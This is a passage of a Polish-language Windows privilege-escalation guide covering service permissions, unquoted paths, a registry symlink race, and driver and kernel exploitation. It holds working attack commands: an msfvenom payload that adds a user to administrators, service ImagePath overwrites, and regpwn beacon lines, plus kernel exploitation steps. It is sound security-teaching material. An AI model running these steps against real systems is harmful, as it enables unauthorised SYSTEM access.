**Sprawdź, czy możesz zmodyfikować plik binarny uruchamiany przez usługę** lub czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się plik binarny ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (nie w system32) możesz uzyskać listę wszystkich plików binarnych uruchamianych przez usługi, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych uprawnień ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** do pliku wykonywalnego usługi albo katalogu, w którym się on znajduje. Praktyczny przebieg ataku:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny payloadem lub poprawnym złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub zaczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne zautomatyzowane kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi na jej ponowne uruchomienie, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję ponownego uruchomienia po awarii lub można ją pośrednio uruchomić za pomocą korzystającej z niej aplikacji.

### Uprawnienia do modyfikowania rejestru usług

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi za pomocą:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Oryginalny test uprawnień brzmiał:

Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia `FullControl`. Jeśli tak, można zmodyfikować plik binarny uruchamiany przez usługę.

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia do zapisu w rejestrze dla konkretnego klucza usługi. Sam wpis ACL nie potwierdza efektywnego dostępu: znaczenie mają wpisy odmowy, bieżący token i uprawnienia dziedziczone. Uprawnienia do klucza rejestru są niezależne od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Do eskalacji wymagane są również użyteczne pole konfiguracji usługi, możliwość jej uruchomienia oraz tożsamość usługi o wyższych uprawnieniach. Zobacz dokumentację Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę do pliku binarnego uruchamianego przez usługę:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig z dowiązaniem symbolicznym rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które są później kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Race** z dowiązaniem symbolicznym rejestru może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość zapisu **dowolnej wartości HKLM**.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje kontrolowaną przez użytkownika konfigurację.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania/przejścia do bezpiecznego pulpitu i jest zapisywalny przez użytkownika.

Przebieg nadużycia (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą ma zapisać SYSTEM.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), co rozpoczyna przepływ AT broker.
3. **Wygraj race**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, zastąp klucz **HKLM Session ATConfig** **dowiązaniem rejestru** do chronionego celu HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Po uzyskaniu możliwości zapisu dowolnej wartości HKLM przejdź do LPE, nadpisując wartości konfiguracji usługi:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach race.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory w rejestrze usług

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows to **wystarczy, aby wykonać dowolny kod:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdą jej część kończącą się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wypisz wszystkie ścieżki usług nieujęte w cudzysłów, z wyjątkiem ścieżek należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania naprawcze

System Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, możliwa jest eskalacja uprawnień. Więcej informacji znajduje się w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazane przez zadania zaplanowane

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wymieniony w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnego argumentu plikowego interpretera, takiego jak PowerShell `-File`. Jeśli zaplanowany plik wsadowy zawiera bezpośrednie wywołanie PowerShell `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń w powłoce wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący ma prawa zapisu, stanowi trop prowadzący do wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowane konto zadania różni się od konta wywołującego, a zadanie rzeczywiście dociera do tej akcji. ACL pozwalający wyłącznie na dopisywanie danych może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przepływ sterowania może sprawić, że dopisane wiersze nie zostaną wykonane. Przed stwierdzeniem, że możliwa jest eskalacja, potwierdź efektywne ACL-e, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz oraz politykę kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W systemie plików NTFS plik z prawami do odczytu może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna podczas zwykłego wyświetlania katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je za pomocą [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell — poleceniem [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca obecność sekretu to tylko trop. Sprawdź efektywne prawa odczytu pliku, obsługę strumieni przez system plików, to, czy strumień zawiera użyteczne dane uwierzytelniające, oraz konto, na które faktycznie pozwalają się uwierzytelnić. Podczas rutynowej enumeracji unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Dane wejściowe pomocnika Windows Driver Kit uruchamianego przez harmonogram

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może używać plików `command.txt`, `reboot.rsf` oraz pliku projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zaplanowane zadanie lub usługa uruchamiająca tego pomocnika z kontem uprzywilejowanym mogą wykorzystać prawa zapisu użytkownika o niskich uprawnieniach do tych danych wejściowych, aby wykonać polecenia w kontekście tego konta, nawet jeśli sam plik wykonywalny pomocnika jest chroniony. Potwierdź, że istnieje uprzywilejowany proces, który z nich korzysta, oraz że można utworzyć lub zmodyfikować **oba** pliki towarzyszące; samo znalezienie pomocnika nie wystarczy.

W przypadku zaplanowanego zadania sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL-e dwóch ścieżek plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego jest tylko tropem do zweryfikowania, a nie dowodem na to, skąd zadanie odczytuje dane wejściowe. Musi być również spełniony warunek dotyczący pliku projektu. Sprawdź rzeczywiste konto zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może możesz podmienić jeden z nich i eskalować uprawnienia) oraz **folderów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk w systemie Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk dla systemu Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — wykonywały istniejący wcześniej plik chroniony przed zapisem. Producent naprawił problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny poziom zainstalowanej poprawki oraz to, czy może zostać uruchomiona operacja agenta, której dotyczy problem; sama etykieta gałęzi, taka jak `2.1`, nie pozwala ustalić, czy system jest podatny. Enumeracja może sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Przegląd usługi SAML w ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło wersji ADSelfService Plus o numerze build 6210 i wcześniejszych; producent naprawił problem w build 6211. Problem ma znaczenie tylko wtedy, gdy logowanie jednokrotne SAML **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: potwierdź dokładny build, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu przez usługę odbywa się z uprawnieniami tego konta; wykonanie jako SYSTEM wymaga instancji uruchomionej jako SYSTEM. Czytelny plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na dostępne dane uwierzytelniające ani na tę lukę SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i prawa dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins w systemie Windows rozróżnij uprawnienia do utworzenia lub skonfigurowania zadania od uprawnień do jego uruchomienia: [Jenkins opisuje je jako osobne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalny wyzwalacz może zapewniać inną drogę uruchomienia, ale potwierdź, że jest włączony i że kompilacja faktycznie się wykonuje. Kod działa z tożsamością kontrolera lub wybranego agenta, a zapisane dane uwierzytelniające można wykorzystać tylko wtedy, gdy zadanie ma dostęp do ich zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje dane uwierzytelniające i klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów w Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; zweryfikuj **prawo odczytu wymaganych plików** i odrębną ścieżkę ponownego użycia konta, nie wypisując sekretów we współdzielonych wynikach. Jeśli to konto ma prawo zapisu do `scriptPath` obiektu użytkownika AD, przed uznaniem tego za wykonanie kodu w kontekście innego użytkownika potwierdź, że ścieżka skryptu jest zapisywalna i że istnieje rzeczywisty proces logowania lub zaplanowane zadanie uruchamiające skrypt jako użytkownik docelowy. Dodatkowe możliwości kontroli grup wymagają osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta self-hosted w Azure Pipelines

W projekcie Azure DevOps Server lub Azure Pipelines rozróżnij uprawnienia do **utworzenia lub edycji** pipeline’u od uprawnień do jego **uruchomienia** i korzystania z wybranej puli agentów; [Microsoft osobno opisuje uprawnienia pipeline’ów](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) oraz [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Jeśli konto z niższymi uprawnieniami może przesłać krok skryptu i uruchomić pipeline na agencie self-hosted w systemie Windows, krok ten jest wykonywany jako [skonfigurowane konto systemu operacyjnego agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że doszło do przejścia między użytkownikami lub uzyskania uprawnień SYSTEM, zweryfikuj konkretny pipeline, ograniczenia dotyczące gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub prawo zapisu do repozytorium to jedynie wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Dane uwierzytelniające Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, na którym działa usługa synchronizacji i które uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Dane uwierzytelniające łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał klucza jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, lokalna grupa o nazwie sugerującej uprawnienia administratora lub dostęp do bazy danych nie potwierdzają, że można odszyfrować dane uwierzytelniające ani eskalować uprawnienia w domenie. Osobno sprawdź rzeczywiste prawa odczytu bazy danych, dostęp konta usługi do klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wykazywać tylko metadane usługi i dostępu, a nie odpytywać ani wyświetlać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługi sterownika drukarki

Zainstalowany sterownik drukarki może przechowywać pomocnicze biblioteki DLL w `C:\ProgramData` i ładować je w procesie o wyższych uprawnieniach obsługującym drukowanie. Sprawdź listy ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych oraz punktów ponownej analizy, nawet jeśli enumeracja drukarek przez WMI jest niedostępna. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) wskazywana ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis problemu](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapisowalna lista ACL to jedynie wskazówka: sprawdź efektywne prawo zapisu po uwzględnieniu wpisów odmawiających dostępu, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie zabezpieczającym. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu ani wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać specjalny plik, albo zmodyfikować plik binarny uruchamiany przez konto Administratora (schedtasks).

Sposobem na znalezienie słabych uprawnień do folderów i plików w systemie jest:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Trwałość/wykonywanie przez automatyczne ładowanie wtyczek Notepad++

Notepad++ automatycznie ładuje dowolne biblioteki DLL wtyczek znajdujące się w podfolderach `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna/kopia, umieszczenie złośliwej wtyczki zapewnia automatyczne wykonanie kodu wewnątrz `notepad++.exe` przy każdym uruchomieniu (w tym z poziomu `DllMain` i wywołań zwrotnych wtyczek).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie przy starcie

**Sprawdź, czy możesz nadpisać jakiś wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Poszukaj potencjalnie **dziwnych/podatnych** sterowników **innych firm**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli driver udostępnia prymitywne operacje odczytu/zapisu w kernelu o dowolnym adresie (częste w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, bezpośrednio kradnąc token SYSTEM z pamięci kernela.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Powiązane materiały o kernel exploitation w Windows:

Przykład z ring bufferem w trybie kernel i rejestrami odczytu/zapisu, które można modyfikować z poziomu user mode, znajdziesz w [wariancie USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera kontrolowaną przez atakującego ścieżkę Object Manager, celowe spowolnienie wyszukiwania (za pomocą komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do dziesiątek mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF w kolejkach cancel-safe, wycieki z paged pool i pivoty I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch osobno mało groźnych błędów: **race condition w cyklu życia cancel-safe queue**, która zwalnia żądanie/CBD, gdy blokada kolejki jest nadal utrzymywana, oraz wycieku przez **zwolnienie blokady przed kopiowaniem**, który ujawnia zwolnioną alokację paged pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i exploitation:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu wykonującej **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu wywołuje `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolniony `PFLT_CALLBACK_DATA` do callbacka usuwającego drivera.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą kontrolowanej przez atakującego alokacji paged pool o tym samym rozmiarze. Wpisy kolejki danych `NPFS` są przydatne, bo można kontrolować ich zawartość i rozmiar, a następnie sprawdzać je za pomocą operacji odczytu/podglądu pipe. Jeśli zwolniony obiekt zawiera linki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci user mode**, aby driver wielokrotnie przetwarzał struktury żądań zdefiniowane przez atakującego, zamiast kończyć działanie na oryginalnej głowie listy.
- **Rozszerz przewidywalny zapis**: jeśli fałszywe żądanie przekieruje zagnieżdżony wskaźnik kontekstu używany przez zapisy porządkowe (znaczniki czasu / QPC / pola sąsiadujące z licznikiem referencji), możesz uzyskać zapis w kernelu z **kontrolowanym adresem, ale niekontrolowaną wartością**. W takim przypadku za cel obierz pole **length/size** obiektu z rozpryskanej puli, a nie końcowy wskaźnik kodu/danych, a następnie przeszukaj rozpryskane obiekty, aż uszkodzony obiekt umożliwi **odczyt poza zakresem z paged pool**.
- **Wzorzec podatnego na race condition wycieku**: każdy syscall wykonujący `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` jest dobrym kandydatem. Niezawodność wzrasta, gdy atakujący może zwiększyć kopiowany bufor (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększą końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę bez konieczności powodowania awarii systemu.
- **Cele uzupełniania puli zawierające wiele wskaźników**: tablice zarejestrowanych buforów **I/O ring** w Windows są doskonałymi celami wycieku, ponieważ ich rozmiar w paged pool jest kontrolowany przez atakującego (`8 * regBufferCnt`), a każdy element zawiera wskaźnik kernela do `_IOP_MC_BUFFER_ENTRY`. Ujawnij jedną z tych tablic, odzyskaj otaczający ją `IORING_OBJECT`, a następnie uszkodź **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z podrobionych przez atakującego wpisów i umożliwiały dowolny odczyt/zapis w kernelu. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby utworzyć wskaźnik user mode z powtarzającymi się bajtami, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam podrobioną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki podczas debugowania:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Po uzyskaniu dowolnego odczytu/zapisu w kernelu przez uszkodzony I/O ring, przejmij token SYSTEM przy użyciu standardowego workflow po uzyskaniu primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives uszkodzenia pamięci hive rejestru

Współczesne podatności hive pozwalają przygotować deterministyczne układy pamięci, nadużywać zapisywalnych elementów potomnych HKLM/HKU i przekształcać uszkodzenie metadanych w przepełnienia kernel paged-pool bez niestandardowego drivera. Poznaj pełny łańcuch tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Pomylenie typów w trybie direct `RtlQueryRegistryValues` ze ścieżkami kontrolowanymi przez atakującego

Niektóre drivery przyjmują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT` i przekazują jako cel skalarną zmienną ze stosu, taką jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane na podstawie **rzeczywistego** typu rejestru, a nie typu oczekiwanego przez programistę.

Pozwala to uzyskać dwa przydatne primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka bezwzględna `\Registry\...` pozwala driverowi odpytywać klucze wybrane przez atakującego, ujawniać ich istnienie przez kody zwrotne/logi, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Uszkodzenie pamięci kernela**: skalarne miejsce docelowe, takie jak `&readValue`, może zostać błędnie zinterpretowane jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze — zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** z `RTL_QUERY_REGISTRY_DIRECT`, ale bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela kończą się awarią `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploita, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemowych**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie wartości w zaufanym hive**: użyj NtObjectManager do wyliczenia zapisywalnych elementów potomnych `\Registry\Machine`, a następnie ponów skanowanie z duplikowanym tokenem **low-integrity**, aby znaleźć klucze dostępne z kontekstów sandboxowanych:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

